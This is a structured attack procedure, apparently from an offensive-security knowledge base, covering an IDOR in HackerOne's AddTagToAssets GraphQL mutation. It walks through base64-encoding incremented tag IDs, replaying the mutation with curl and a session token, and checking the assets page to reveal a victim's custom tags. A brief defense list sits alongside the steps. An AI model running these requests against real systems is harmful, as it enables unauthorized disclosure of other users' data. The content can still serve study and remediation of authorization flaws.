---
tags:
  - idor
  - bruteforce
  - graphql-mutation
  - disclosure
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-addtagtoassets]]'
  - '[[commands/base64-encode]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:48.106Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 7870dc5a-9704-48c0-9b36-b09f329e6a4d
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Bruteforce-Tag-IDs-for-IDOR-Disclosure

## Summary

This procedure exploits the IDOR in HackerOne's AddTagToAssets GraphQL operation by bruteforcing predictable tag IDs, allowing unauthorized viewing of the victim's custom tags on the assets page despite API authorization failures.

## Description

Leveraging the decoded ID pattern from prior steps, this sends modified GraphQL mutations with tampered tagIds to probe for existing tags owned by the victim. The API returns NOT_FOUND for invalid IDs but reflects valid tags in the UI without ownership checks, leading to information disclosure. Requires an active session and the base request template.

## Requirements

1. Captured legitimate AddTagToAssets request payload
2. List of sequential IDs to test (e.g., increment from known base)
3. Tool for sending HTTP requests (curl or proxy repeater)

## Defense

Defensive measures and detection strategies:

- Enforce strict authorization checks on tagId before query execution
- Rate-limit GraphQL mutations and monitor for sequential ID probing
- Avoid predictable ID formats; use UUIDs or ownership validation

## Objectives

1. Send mutated requests with bruteforced tagIds
2. Handle API errors while checking UI for tag reflection
3. Achieve unauthorized tag disclosure

## Instructions

### Step 1: Prepare Modified tagId

**Context**: Increment the numeric ID and re-encode to base64 for the mutation.

Take the decoded ID (e.g., gid://hackerone/AsmTag/4979xxxx), increment to 4979xxxx+1, and encode.

Execute [[commands/base64-encode]]:

```bash
echo -n 'gid://hackerone/AsmTag/4979yyyy' | base64
```

> Outputs new tagId like "Z2lkOi8vaGFja2Vyb25lL0FzbVRhZy80OTc5YYYY".

**Expected Output**: Base64-encoded tampered tagId.

### Step 2: Send Mutated GraphQL Request

**Context**: Replay the captured request with the new tagId to probe.

Use the full payload from the captured request, replace tagId, and send via POST.

Execute [[commands/curl-addtagtoassets]] (adapt with actual asset IDs and headers from capture):

```bash
curl -X POST https://hackerone.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_SESSION_TOKEN' \
  -d '{"operationName":"AddTagToAssets","variables":{"input":{"tagId":"Z2lkOi8vaGFja2Vyb25lL0FzbVRhZy80OTc5YYYY","assetIds":["gid://hackerone/Asset/12345"]}},"query":"mutation AddTagToAssets($input: AddTagToAssetsInput!) { addTagToAssets(input: $input) { success } }"}'
```

> API returns 200 with {"data":null,"errors":[{"message":"AsmTag does not exist"}]} for invalid IDs.

**Expected Output**: HTTP 200 response with error for non-existent tags.

### Step 3: Check Assets Page for Disclosure

**Context**: Despite API errors, valid tags may appear in the UI due to missing checks.

After sending requests for sequential IDs, refresh the attacker's assets page and inspect for the victim's tag.

**Expected Output**: Victim's custom tag (e.g., "sensitive-victim-tag") visible on assets page.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-addtagtoassets]]
- [[commands/base64-encode]]

## Tools Used


## Tags

- idor
- bruteforce
